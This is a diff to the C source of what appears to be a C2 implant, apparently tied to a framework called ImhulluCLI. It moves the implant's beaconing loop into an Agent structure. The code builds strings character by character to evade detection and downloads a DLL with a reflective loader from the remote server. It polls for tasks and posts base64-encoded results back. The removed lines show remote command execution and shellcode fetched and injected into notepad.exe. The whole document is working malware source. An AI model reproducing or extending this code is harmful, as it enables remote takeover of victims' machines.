@@ -5,6 +5,7 @@
 #include "../include/typedefs.h"
 #include "../include/task.h"
 #include "../include/json.h"
+#include "../include/agent.h"
 #include <time.h>
 
 // will be overwritten by ImhulluCLI
@@ -197,12 +198,21 @@ void myMain()
     // shlwapi
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
 
-    // downloaded DLL with the reflective loader in it
-    DLL primalDll;
-    PDLL pPrimalDll = &primalDll;
+    Agent agent;
+    Agent* pAgent = &agent;
 
-    WCHAR wServer[] = { SERVER_M } ;
-    INTERNET_PORT port = PORT_M;
+    WCHAR wRemoteServer[] = { SERVER_M };
+    DWORD dwRemoteServerLength = myStrlenW(wRemoteServer)+1;
+    INTERNET_PORT dwRemotePort = PORT_M;
+
+    if (AgentPopulate(api, pAgent, wRemoteServer, dwRemoteServerLength, dwRemotePort, 3) == FALSE)
+    {
+        DEBUG_PRINTF_ERROR("%s", "myMain: AgentPopulate failed\n");
+    }
+
+    // downloaded DLL with the reflective loader in it
+    DLL primalDll = {.pBuffer = NULL, .Size = 0};
+    PDLL pPrimalDll = &primalDll;
 
     #ifdef DEBUG
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
@@ -211,7 +221,7 @@ void myMain()
 
     while (pPrimalDll->pBuffer == NULL)
     {
-        pPrimalDll->pBuffer = httpGetExecutable(api, &pPrimalDll->Size, wcStageEndpoint, wServer, port);
+        pPrimalDll->pBuffer = httpGetExecutable(api, &pPrimalDll->Size, wcStageEndpoint, pAgent->_remoteServer, pAgent->_remotePort);
         ((SLEEP)api->Sleep)(5000);
         if (pPrimalDll->pBuffer != NULL)
         { break; }
@@ -262,7 +272,7 @@ void myMain()
     '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
     ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
     '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
-    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}'
+    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', 0
     };
     DWORD totalJsonSize;
     CHAR* json;
@@ -274,11 +284,11 @@ void myMain()
 
     while (TRUE)
     {
-        jsonResponse = GetRequest(api, wServer, port, pathTasks);
+        jsonResponse = GetRequest(api, pAgent->_remoteServer, pAgent->_remotePort, pathTasks);
 
         if (!jsonResponse)
         {
-            ((SLEEP)api->Sleep)(3000);
+            ((SLEEP)api->Sleep)(agent._interval);
             continue;
         }
 
@@ -289,56 +299,14 @@ void myMain()
         // readJsonTask returns a task struct with all fields equal to NULL
         if (task.taskId == NULL)
         {
-            ((SLEEP)api->Sleep)(3000);
+            ((SLEEP)api->Sleep)(agent._interval);
             continue;
         }
 
-        if (my_strcmp(task.taskType, TASK_CMD) == 0)
+        if (AgentExecuteTask(pAgent, api, PEsgStdApi, pEsgStdDll, task, &taskOutput, &sizeOfOutput) == FALSE)
         {
-            orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task.taskParams, &sizeOfOutput);
-            taskOutput = myTrim(api, orgOutput, '\n');
-        }
-        else if (my_strcmp(task.taskType, TASK_WHOAMI) == 0)
-        {
-            orgOutput = ((WHOAMI)PEsgStdApi->Whoami)(&sizeOfOutput);
-            taskOutput = myTrim(api, orgOutput, '\n');
-        }
-        else if (my_strcmp(task.taskType, TASK_SHUTDOWN) == 0)
-        {
-            const DWORD dwEncodedExitOutputSize = 17;
-            // base64 value of exitSuccess
-            CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
-            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.agentUuid) + 16;
-            json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
-            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
-            PostRequest(api, wServer, port, pathSendTaskOutput, json);
-
-            ((FREE)api->free)(pEsgStdDll->pBuffer);
-            ((FREE)api->free)(json);
-            ((FREE)api->free)(task.taskParams);
-
-            ((EXITTHREAD)api->ExitThread)(0);
-        }
-        else if (my_strcmp(task.taskType, TASK_EXECUTE_ASSEMBLY) == 0)
-        {
-            // use notepad.exe to inject code into
-            CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
-            DWORD dwShellcodeSize;
-            WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
-            LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
-            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
-            taskOutput = ((CALLOC)api->calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));
-            if (taskOutput != NULL) {
-                for (int i = 0; i < myStrlenA(TASK_EXECUTE_ASSEMBLY)+1; i++)
-                {
-                    taskOutput[i] = TASK_EXECUTE_ASSEMBLY[i];
-                }
-            }
-            ((FREE)api->free)(shellcode);
-        }
-        else
-        {
-            ((SLEEP)api->Sleep)(3000);
+            DEBUG_PRINTF_WARNING("%s", "myMain: AgentExecuteTask failed, no task present or execution failed\n");
+            ((SLEEP)api->Sleep)(agent._interval);
             continue;
         }
 
@@ -350,12 +318,12 @@ void myMain()
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
         // calculate the final json size
-        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(task.taskId) + myStrlenA(task.agentUuid) + 16;
+        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(task.taskId) + myStrlenA(task.agentUuid);
         // allocate memory for the final json
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         // fill the jsonFormat with relevant values
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, b64EncodedOutput);
-        PostRequest(api, wServer, port, pathSendTaskOutput, json);
+        PostRequest(api, pAgent->_remoteServer, pAgent->_remotePort, pathSendTaskOutput, json);
 
         ((FREE)api->free)(taskOutput);
         taskOutput = NULL;
